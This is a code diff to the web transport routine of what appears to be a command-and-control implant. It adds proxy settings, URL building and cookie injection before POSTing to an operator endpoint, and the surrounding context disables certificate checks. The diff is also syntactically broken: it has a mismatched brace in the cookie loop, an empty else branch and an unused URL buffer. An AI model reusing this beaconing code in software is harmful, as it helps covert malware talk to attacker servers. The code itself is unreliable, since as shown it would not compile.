@@ -14,7 +14,6 @@ auto DECLFN Transport::WebSend(
     HANDLE hRequest = NULL;
 
     ULONG  HttpAccessType  = 0;
-    PWCHAR HttpProxy       = { 0 };
     ULONG  HttpFlags       = 0;
     ULONG  OptFlags        = 0;
 
@@ -32,9 +31,11 @@ auto DECLFN Transport::WebSend(
 
     HttpFlags = INTERNET_FLAG_RELOAD;
 
+    if ( Self->Tsp->Web.ProxyEnabled ) HttpAccessType = INTERNET_OPEN_TYPE_PROXY;
+
     hSession = Self->Wininet.InternetOpenW(   
         Self->Tsp->Web.UserAgent, HttpAccessType,
-        HttpProxy, 0, 0
+        Self->Tsp->Web.ProxyUrl, 0, 0
     );
     if ( !hSession ) { KhDbg( "last error: %d", KhGetError ); goto _KH_END; }
 
@@ -53,6 +54,24 @@ auto DECLFN Transport::WebSend(
             SECURITY_FLAG_IGNORE_WRONG_USAGE         |
             SECURITY_FLAG_IGNORE_WEAK_SIGNATURE;
     }        
+
+    WCHAR TargetUrl[MAX_PATH*2] = { 0 };
+
+    if ( Self->Tsp->Web.Secure ) {
+        Str::ContatW( TargetUrl, L"https://", Str::LengthW( L"https://" ) );    
+    } else {
+
+    }
+
+    Str::ContatW( TargetUrl, Self->Tsp->Web.Host, Str::LengthW( Self->Tsp->Web.Host ) );
+
+    for ( INT i = 0; i < WEB_HTTP_COOKIES_QTT; i++ )
+        Self->Wininet.InternetSetCookieW(
+            Self->Tsp->Web.Host,
+            nullptr,
+            Self->Tsp->Web.Cookies[i]            
+        );
+    }
 
     hRequest = Self->Wininet.HttpOpenRequestW( 
         hConnect, L"POST", Self->Tsp->Web.EndPoint, NULL, 
